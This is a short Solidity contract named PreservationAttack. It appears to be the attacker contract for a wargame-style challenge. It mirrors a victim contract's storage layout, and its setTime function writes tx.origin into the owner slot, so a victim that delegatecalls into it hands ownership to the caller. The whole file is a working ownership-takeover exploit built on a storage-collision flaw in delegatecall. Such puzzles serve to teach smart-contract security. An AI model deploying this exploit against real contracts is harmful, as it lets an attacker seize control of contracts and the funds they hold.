// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationAttack {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = tx.origin;
    }
}
